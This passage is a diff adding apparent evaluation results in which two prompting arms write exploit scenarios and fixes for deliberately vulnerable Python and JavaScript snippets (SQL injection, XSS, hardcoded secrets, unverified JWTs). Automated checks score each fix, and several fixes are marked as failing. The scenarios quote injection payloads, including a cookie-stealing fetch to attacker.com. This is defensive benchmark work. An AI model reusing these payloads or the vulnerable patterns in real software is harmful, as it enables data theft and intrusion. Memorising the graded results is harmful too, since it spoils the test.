@@ -1,0 +1,1102 @@
+{
+  "records": [
+    {
+      "id": "sqli-py-login",
+      "language": "python",
+      "vulnerability_class": "sql_injection",
+      "source": "exercise",
+      "code": "import sqlite3\n\n\ndef find_user(conn, username):\n    cur = conn.cursor()\n    cur.execute(\"SELECT id, email FROM users WHERE username = '\" + username + \"'\")\n    return cur.fetchone()\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this SQL injection vulnerability by supplying a specially crafted username string, such as \"' OR '1'='1\", which alters the structure of the SQL query. This allows the attacker to bypass authentication, extract unauthorized data from the users table, or potentially manipulate the database.",
+          "fixed_code": "import sqlite3\n\n\ndef find_user(conn, username):\n    cur = conn.cursor()\n    cur.execute(\"SELECT id, email FROM users WHERE username = ?\", (username,))\n    return cur.fetchone()\n",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply a specially crafted string for the username parameter, such as \"' OR '1'='1\", which breaks out of the intended SQL string literal and modifies the logic of the query. This SQL Injection allows an unauthorized user to bypass authentication and retrieve sensitive information, such as the first user record in the database, without knowing a valid username.",
+          "fixed_code": "import sqlite3\n\n\ndef find_user(conn, username):\n    cur = conn.cursor()\n    cur.execute(\"SELECT id, email FROM users WHERE username = ?\", (username,))\n    return cur.fetchone()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "sqli-py-search",
+      "language": "python",
+      "vulnerability_class": "sql_injection",
+      "source": "exercise",
+      "code": "def search_products(cur, term):\n    cur.execute(f\"SELECT name, price FROM products WHERE name LIKE '%{term}%'\")\n    return cur.fetchall()\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can input malicious SQL syntax into the 'term' parameter, such as a single quote followed by UNION SELECT statements (e.g., ' UNION SELECT username, password FROM users --). Because the code uses Python string formatting to construct the SQL query directly, the database executes the attacker's injected SQL commands, allowing unauthorized data access or modification.",
+          "fixed_code": "def search_products(cur, term):\n    cur.execute(\"SELECT name, price FROM products WHERE name LIKE ?\", (f\"%{term}%\",))\n    return cur.fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply a malicious input for the 'term' parameter, such as \"%'; DROP TABLE products; --\", which alters the intended SQL query structure. This allows them to execute arbitrary SQL commands against the database, potentially leading to unauthorized data access, data modification, or complete database destruction.",
+          "fixed_code": "def search_products(cur, term):\n    query = \"SELECT name, price FROM products WHERE name LIKE %s\"\n    search_term = f\"%{term}%\"\n    cur.execute(query, (search_term,))\n    return cur.fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "sqli-js-delete",
+      "language": "javascript",
+      "vulnerability_class": "sql_injection",
+      "source": "exercise",
+      "code": "function deleteComment(db, commentId) {\n  return db.run(\"DELETE FROM comments WHERE id = \" + commentId);\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker could supply malicious input for the commentId parameter, such as '1 OR 1=1', which would alter the structure of the SQL query. Because the input is directly concatenated into the query string, this allows the execution of arbitrary SQL commands, potentially leading to the unauthorized deletion of all records in the comments table or other database compromise.",
+          "fixed_code": "function deleteComment(db, commentId) {\n  return db.run(\"DELETE FROM comments WHERE id = ?\", [commentId]);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this SQL injection vulnerability by manipulating the 'commentId' parameter. If the input is crafted maliciously, such as '1 OR 1=1', the resulting query becomes 'DELETE FROM comments WHERE id = 1 OR 1=1', which would delete all comments in the database instead of just the intended record.",
+          "fixed_code": "function deleteComment(db, commentId) {\n  return db.run(\"DELETE FROM comments WHERE id = ?\", [commentId]);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "xss-js-greeting",
+      "language": "javascript",
+      "vulnerability_class": "xss",
+      "source": "exercise",
+      "code": "const params = new URLSearchParams(window.location.search);\nconst name = params.get(\"name\");\ndocument.getElementById(\"welcome\").innerHTML = \"Hello, \" + name;\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can manipulate the 'name' query parameter in the URL to include malicious JavaScript, such as '<img src=x onerror=alert(document.domain)>'. When the victim visits the crafted URL, the code directly assigns this input to 'innerHTML', causing the browser to execute the attacker's script in the context of the user's session.",
+          "fixed_code": "const params = new URLSearchParams(window.location.search);\nconst name = params.get(\"name\");\nconst welcomeElement = document.getElementById(\"welcome\");\nwelcomeElement.textContent = \"Hello, \" + (name || \"\");",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can craft a malicious URL containing JavaScript code within the 'name' parameter (e.g., ?name=<img src=x onerror=alert(document.cookie)>). Because the code uses innerHTML to insert the untrusted parameter directly into the DOM, the browser executes the script in the context of the user's session, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.",
+          "fixed_code": "const params = new URLSearchParams(window.location.search);\nconst name = params.get(\"name\");\ndocument.getElementById(\"welcome\").textContent = \"Hello, \" + name;",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "xss-js-comment",
+      "language": "javascript",
+      "vulnerability_class": "xss",
+      "source": "exercise",
+      "code": "function renderComment(container, comment) {\n  container.insertAdjacentHTML(\"beforeend\", \"<p>\" + comment.text + \"</p>\");\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can submit a malicious comment containing JavaScript, such as '<img src=x onerror=alert(document.cookie)>'. When the application uses insertAdjacentHTML to render the unescaped comment text directly into the DOM, the browser executes the malicious script in the context of the victim's session, leading to session hijacking or unauthorized actions.",
+          "fixed_code": "function renderComment(container, comment) {\n  const p = document.createElement('p');\n  p.textContent = comment.text;\n  container.appendChild(p);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can submit a malicious comment containing JavaScript code, such as '<img src=x onerror=alert(document.cookie)>'. When the application renders this comment using insertAdjacentHTML with unsanitized user input, the browser executes the script in the context of the user's session, leading to a Cross-Site Scripting (XSS) vulnerability.",
+          "fixed_code": "function renderComment(container, comment) {\n  const p = document.createElement('p');\n  p.textContent = comment.text;\n  container.appendChild(p);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "xss-py-flask",
+      "language": "python",
+      "vulnerability_class": "xss",
+      "source": "exercise",
+      "code": "from flask import Flask, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return \"<h1>Hello, \" + name + \"</h1>\"\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply a malicious JavaScript payload in the 'name' query parameter (e.g., ?name=<script>alert(document.cookie)</script>). Because the application directly concatenates this user input into the HTML response without sanitization or escaping, the browser executes the script when rendering the page, leading to Reflected Cross-Site Scripting (XSS).",
+          "fixed_code": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return render_template_string(\"<h1>Hello, {{ name }}</h1>\", name=name)\n",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [
+              "other"
+            ],
+            "good_fix": false
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this Cross-Site Scripting (XSS) vulnerability by supplying malicious JavaScript code via the 'name' query parameter (e.g., /hello?name=<script>alert('XSS')</script>). When the server reflects this input directly into the HTML response without sanitization or escaping, the browser executes the script in the context of the user's session, potentially leading to session hijacking or credential theft.",
+          "fixed_code": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return render_template_string(\"<h1>Hello, {{ name }}</h1>\", name=name)",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [
+              "other"
+            ],
+            "good_fix": false
+          }
+        }
+      }
+    },
+    {
+      "id": "secret-py-api-key",
+      "language": "python",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "exercise",
+      "code": "import requests\n\nPAYMENT_API_KEY = \"demo_payments_key_9f8e7d6c5b4a39\"\n\n\ndef charge(amount):\n    return requests.post(\n        \"https://payments.example.com/charge\",\n        headers={\"Authorization\": \"Bearer \" + PAYMENT_API_KEY},\n        json={\"amount\": amount},\n        timeout=10,\n    )\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker who gains read access to the source code repository or decompiles the application can extract the hardcoded PAYMENT_API_KEY. This secret can then be used to perform unauthorized payment transactions against the API endpoint, bypassing access controls.",
+          "fixed_code": "import os\nimport requests\n\nPAYMENT_API_KEY = os.getenv(\"PAYMENT_API_KEY\")\n\n\ndef charge(amount):\n    if not PAYMENT_API_KEY:\n        raise ValueError(\"PAYMENT_API_KEY environment variable is not set\")\n    return requests.post(\n        \"https://payments.example.com/charge\",\n        headers={\"Authorization\": \"Bearer \" + PAYMENT_API_KEY},\n        json={\"amount\": amount},\n        timeout=10,\n    )",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker with read access to the source code repository or build artifacts can extract the hardcoded API key (PAYMENT_API_KEY). They can then reuse this valid token to make unauthorized payment requests or drain funds from the associated payment gateway account.",
+          "fixed_code": "import os\nimport requests\n\n\ndef charge(amount):\n    payment_api_key = os.environ.get(\"PAYMENT_API_KEY\")\n    if not payment_api_key:\n        raise ValueError(\"PAYMENT_API_KEY environment variable not set\")\n    return requests.post(\n        \"https://payments.example.com/charge\",\n        headers={\"Authorization\": \"Bearer \" + payment_api_key},\n        json={\"amount\": amount},\n        timeout=10,\n    )",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "secret-py-db-password",
+      "language": "python",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "exercise",
+      "code": "import psycopg\n\n\ndef connect():\n    return psycopg.connect(host=\"db.internal\", user=\"app\", password=\"Sup3rS3cret!2024\")\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker who gains read access to the source code repository or the compiled distribution package can extract the hardcoded database password. They can then use these credentials to authenticate directly to the internal database from an external network, assuming network access is permitted, potentially leading to unauthorized data access, modification, or deletion.",
+          "fixed_code": "import os\nimport psycopg\n\n\ndef connect():\n    db_password = os.environ.get(\"DB_PASSWORD\")\n    if not db_password:\n        raise ValueError(\"DB_PASSWORD environment variable is not set\")\n    return psycopg.connect(host=\"db.internal\", user=\"app\", password=db_password)",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The code contains hardcoded sensitive credentials (username and password) directly in the source code. An attacker who gains access to the source code repository, decompiles the application, or reads the file system can easily extract these credentials and gain unauthorized access to the database.",
+          "fixed_code": "import os\nimport psycopg\n\n\ndef connect():\n    db_host = os.environ.get(\"DB_HOST\", \"db.internal\")\n    db_user = os.environ.get(\"DB_USER\")\n    db_password = os.environ.get(\"DB_PASSWORD\")\n    \n    if not db_user or not db_password:\n        raise ValueError(\"Database credentials must be set in environment variables.\")\n        \n    return psycopg.connect(host=db_host, user=db_user, password=db_password)",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "secret-js-admin-token",
+      "language": "javascript",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "exercise",
+      "code": "const express = require(\"express\");\nconst app = express();\n\nconst adminToken = \"demo-admin-token-48213\";\n\napp.get(\"/admin\", (req, res) => {\n  if (req.headers[\"x-admin-token\"] === adminToken) {\n    res.send(\"welcome\");\n  } else {\n    res.status(403).send(\"forbidden\");\n  }\n});\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can inspect the source code, repository, or bundled application to discover the hardcoded 'adminToken'. They can then include this exact token in the 'x-admin-token' HTTP header when making requests to the '/admin' endpoint, successfully bypassing authentication and gaining unauthorized administrative access.",
+          "fixed_code": "const express = require(\"express\");\nconst app = express();\n\nconst adminToken = process.env.ADMIN_TOKEN;\n\napp.get(\"/admin\", (req, res) => {\n  if (!adminToken) {\n    return res.status(500).send(\"Server misconfiguration\");\n  }\n  if (req.headers[\"x-admin-token\"] === adminToken) {\n    res.send(\"welcome\");\n  } else {\n    res.status(403).send(\"forbidden\");\n  }\n});",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can intercept network traffic or guess the hardcoded administrative token (\"demo-admin-token-48213\") to bypass authentication. Since the token is statically defined in the source code, anyone with access to the codebase or via sniffing HTTP traffic can easily impersonate an administrator and gain unauthorized access to the \"/admin\" endpoint.",
+          "fixed_code": "const express = require(\"express\");\nconst crypto = require(\"crypto\");\nconst app = express();\n\nconst adminToken = process.env.ADMIN_TOKEN || crypto.randomBytes(32).toString(\"hex\");\n\napp.get(\"/admin\", (req, res) => {\n  const providedToken = req.headers[\"x-admin-token\"];\n  \n  if (!providedToken) {\n    return res.status(403).send(\"forbidden\");\n  }\n\n  const tokenBuffer = Buffer.from(providedToken);\n  const adminBuffer = Buffer.from(adminToken);\n\n  if (tokenBuffer.length === adminBuffer.length && crypto.timingSafeEqual(tokenBuffer, adminBuffer)) {\n    res.send(\"welcome\");\n  } else {\n    res.status(403).send(\"forbidden\");\n  }\n});\n\napp.listen(3000);",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "auth-py-jwt-unverified",
+      "language": "python",
+      "vulnerability_class": "broken_authentication",
+      "source": "exercise",
+      "code": "import jwt\n\n\ndef current_user(token):\n    claims = jwt.decode(token, options={\"verify_signature\": False})\n    return claims[\"sub\"]\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can tamper with the JWT token's payload (such as changing the 'sub' claim to represent a different user) and send it to the application. Because the application decodes the token with 'verify_signature': False, it accepts the forged token without checking the cryptographic signature, leading to broken authentication and unauthorized access as another user.",
+          "fixed_code": "import jwt\n\n\ndef current_user(token, secret_key):\n    claims = jwt.decode(token, secret_key, algorithms=[\"HS256\"])\n    return claims[\"sub\"]",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can manipulate the JWT by modifying the payload (e.g., changing the 'sub' claim to a different user ID, such as an administrator's ID). Since the code disables signature verification by setting 'options={\"verify_signature\": False}', the application blindly trusts the incoming token's claims without validating its integrity or authenticity, leading to unauthorized access and privilege escalation.",
+          "fixed_code": "import jwt\n\n\ndef current_user(token):\n    secret = \"YOUR_SECRET_KEY\"\n    claims = jwt.decode(token, secret, algorithms=[\"HS256\"])\n    return claims[\"sub\"]",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [
+              "hardcoded_secret"
+            ],
+            "good_fix": false
+          }
+        }
+      }
+    },
+    {
+      "id": "auth-js-jwt-unverified",
+      "language": "javascript",
+      "vulnerability_class": "broken_authentication",
+      "source": "exercise",
+      "code": "const jwt = require(\"jsonwebtoken\");\n\nfunction requireAdmin(req, res, next) {\n  const claims = jwt.decode(req.headers.authorization);\n  if (claims && claims.role === \"admin\") {\n    return next();\n  }\n  return res.status(403).send(\"forbidden\");\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this vulnerability because jwt.decode() only parses the JSON payload of the JSON Web Token without cryptographically verifying its signature. An attacker can intercept a standard user token, modify the 'role' claim to 'admin', and send the forged token in the Authorization header. Because the application trusts the unverified payload, it grants administrative privileges to the attacker.",
+          "fixed_code": "const jwt = require(\"jsonwebtoken\");\n\nfunction requireAdmin(req, res, next) {\n  const authHeader = req.headers.authorization;\n  if (!authHeader) {\n    return res.status(401).send(\"unauthorized\");\n  }\n  \n  const token = authHeader.split(\" \")[1];\n  if (!token) {\n    return res.status(401).send(\"unauthorized\");\n  }\n\n  try {\n    const claims = jwt.verify(token, process.env.JWT_SECRET, { algorithms: [\"HS256\"] });\n    if (claims && claims.role === \"admin\") {\n      return next();\n    }\n    return res.status(403).send(\"forbidden\");\n  } catch (err) {\n    return res.status(401).send(\"unauthorized\");\n  }\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The code uses jwt.decode() instead of jwt.verify(). jwt.decode() only parses the JWT payload without validating its cryptographic signature or expiration time. An attacker can easily tamper with the JWT payload, change the 'role' claim to 'admin', and send it in the authorization header to bypass authentication and gain unauthorized administrative access.",
+          "fixed_code": "const jwt = require(\"jsonwebtoken\");\n\nfunction requireAdmin(req, res, next) {\n  const authHeader = req.headers.authorization;\n  if (!authHeader) {\n    return res.status(401).send(\"unauthorized\");\n  }\n  const token = authHeader.split(\" \")[1];\n  try {\n    const claims = jwt.verify(token, process.env.JWT_SECRET);\n    if (claims && claims.role === \"admin\") {\n      return next();\n    }\n    return res.status(403).send(\"forbidden\");\n  } catch (err) {\n    return res.status(403).send(\"forbidden\");\n  }\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-sqli-fstring",
+      "language": "python",
+      "vulnerability_class": "sql_injection",
+      "source": "new",
+      "code": "def get_order(conn, order_id):\n    cur = conn.cursor()\n    cur.execute(f\"SELECT * FROM orders WHERE id = {order_id}\")\n    return cur.fetchall()\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can manipulate the 'order_id' parameter to inject malicious SQL commands (e.g., passing '1 OR 1=1') because the input is directly formatted into the SQL query string. This allows unauthorized access to retrieve, modify, or delete unintended database records.",
+          "fixed_code": "def get_order(conn, order_id):\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM orders WHERE id = %s\", (order_id,))\n    return cur.fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker could supply malicious SQL input for the order_id parameter, such as '1 OR 1=1', which alters the structure of the query. This SQL Injection vulnerability allows unauthorized access to all records in the orders table and potentially the entire database.",
+          "fixed_code": "def get_order(conn, order_id):\n    cur = conn.cursor()\n    cur.execute(\"SELECT * FROM orders WHERE id = ?\", (order_id,))\n    return cur.fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-sqli-percent",
+      "language": "python",
+      "vulnerability_class": "sql_injection",
+      "source": "new",
+      "code": "def find_product(cursor, name):\n    query = \"SELECT * FROM products WHERE name = '%s'\" % name\n    cursor.execute(query)\n    return cursor.fetchall()\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious input containing SQL syntax (e.g., `' OR '1'='1`) in the 'name' parameter. Because the input is directly interpolated into the SQL string via string formatting, the application executes the manipulated query, potentially allowing unauthorized data access, data modification, or database compromise.",
+          "fixed_code": "def find_product(cursor, name):\n    query = \"SELECT * FROM products WHERE name = %s\"\n    cursor.execute(query, (name,))\n    return cursor.fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this SQL injection vulnerability by providing a specially crafted input for the 'name' parameter, such as \"' OR '1'='1\". This alters the logic of the SQL query, allowing unauthorized access to all records in the products table or potentially executing malicious SQL commands.",
+          "fixed_code": "def find_product(cursor, name):\n    query = \"SELECT * FROM products WHERE name = %s\"\n    cursor.execute(query, (name,))\n    return cursor.fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-sqli-format",
+      "language": "python",
+      "vulnerability_class": "sql_injection",
+      "source": "new",
+      "code": "def delete_user(cursor, user_id):\n    cursor.execute(\"DELETE FROM users WHERE id = {}\".format(user_id))\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can manipulate the 'user_id' parameter to inject malicious SQL commands (e.g., passing '1 OR 1=1' instead of a valid ID). Because the code directly formats the user input into the SQL query string, the database executes the injected commands, potentially allowing unauthorized deletion of all user records or other malicious database operations.",
+          "fixed_code": "def delete_user(cursor, user_id):\n    cursor.execute(\"DELETE FROM users WHERE id = %s\", (user_id,))",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this SQL injection vulnerability by supplying a malicious payload in the 'user_id' parameter, such as '1 OR 1=1'. This alters the query logic, causing the database to delete all records in the 'users' table instead of just the intended user.",
+          "fixed_code": "def delete_user(cursor, user_id):\n    cursor.execute(\"DELETE FROM users WHERE id = %s\", (user_id,))",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-sqli-sqlalchemy",
+      "language": "python",
+      "vulnerability_class": "sql_injection",
+      "source": "new",
+      "code": "from sqlalchemy import text\n\n\ndef search(session, term):\n    return session.execute(text(\"SELECT * FROM posts WHERE title LIKE '%\" + term + \"%'\")).fetchall()\n",
+      "arms": {
+        "grounded": {
+          "status": "no_output",
+          "error": "reply was not the required JSON"
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply a malicious string for the 'term' parameter containing SQL control characters, such as a single quote, to break out of the string literal. By appending arbitrary SQL commands, they can perform SQL injection attacks to read sensitive data from other tables, modify database contents, or potentially execute administrative operations.",
+          "fixed_code": "from sqlalchemy import text\n\n\ndef search(session, term):\n    query = text(\"SELECT * FROM posts WHERE title LIKE :term\")\n    return session.execute(query, {\"term\": f\"%{term}%\"}).fetchall()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-xss-flask-concat",
+      "language": "python",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "from flask import Flask, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return \"<h1>Hello \" + name + \"</h1>\"\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious JavaScript via the 'name' query parameter, such as '?name=<script>alert(document.cookie)</script>'. Because the application concatenates this user input directly into the HTML response without escaping or using a secure template engine, the browser will execute the injected script when rendering the page, leading to Cross-Site Scripting (XSS).",
+          "fixed_code": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return render_template_string(\"<h1>Hello {{ name }}</h1>\", name=name)\n",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [
+              "other"
+            ],
+            "good_fix": false
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this Cross-Site Scripting (XSS) vulnerability by injecting malicious JavaScript into the 'name' query parameter (e.g., /hello?name=<script>alert(document.cookie)</script>). When the Flask application reflects this input directly into the HTML response without sanitization or escaping, the browser executes the injected script in the context of the victim's session, potentially leading to session hijacking or credential theft.",
+          "fixed_code": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route(\"/hello\")\ndef hello():\n    name = request.args.get(\"name\", \"\")\n    return render_template_string(\"<h1>Hello {{ name }}</h1>\", name=name)",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [
+              "other"
+            ],
+            "good_fix": false
+          }
+        }
+      }
+    },
+    {
+      "id": "py-xss-markup",
+      "language": "python",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "from flask import request\nfrom markupsafe import Markup\n\n\ndef banner():\n    return Markup(\"<div class='banner'>\" + request.args.get(\"msg\", \"\") + \"</div>\")\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker could supply a malicious JavaScript payload via the 'msg' query parameter (e.g., ?msg=<script>alert(document.cookie)</script>). Because the input is directly concatenated into an HTML string and wrapped in Markup, Flask and Jinja will treat it as safe HTML and execute the script in the victim's browser, leading to potential session hijacking or data theft.",
+          "fixed_code": "from flask import request, escape\nfrom markupsafe import Markup\n\n\ndef banner():\n    safe_msg = escape(request.args.get(\"msg\", \"\"))\n    return Markup(f\"<div class='banner'>{safe_msg}</div>\")",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": false,
+            "new_classes": [],
+            "good_fix": false
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this Cross-Site Scripting (XSS) vulnerability by supplying a malicious JavaScript payload in the 'msg' query parameter (e.g., ?msg=<script>alert(1)</script>). Because the user input is directly concatenated into the HTML string and wrapped in Markup without prior sanitization, the browser will execute the injected script in the context of the victim's session.",
+          "fixed_code": "from flask import request, escape\nfrom markupsafe import Markup\n\n\ndef banner():\n    msg = request.args.get(\"msg\", \"\")\n    return Markup(\"<div class='banner'>{}</div>\").format(escape(msg))\n",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-xss-template-string",
+      "language": "python",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "from flask import render_template_string, request\n\n\ndef profile():\n    bio = request.form[\"bio\"]\n    return render_template_string(\"<p>\" + bio + \"</p>\")\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can submit malicious JavaScript payload (e.g., `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`) via the 'bio' form field. Because the input is directly concatenated into a string and processed by `render_template_string`, the template engine evaluates and executes the script in the context of any viewing user's browser, allowing session hijacking or data theft.",
+          "fixed_code": "from flask import render_template, request\n\n\ndef profile():\n    bio = request.form[\"bio\"]\n    return render_template(\"profile.html\", bio=bio)",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
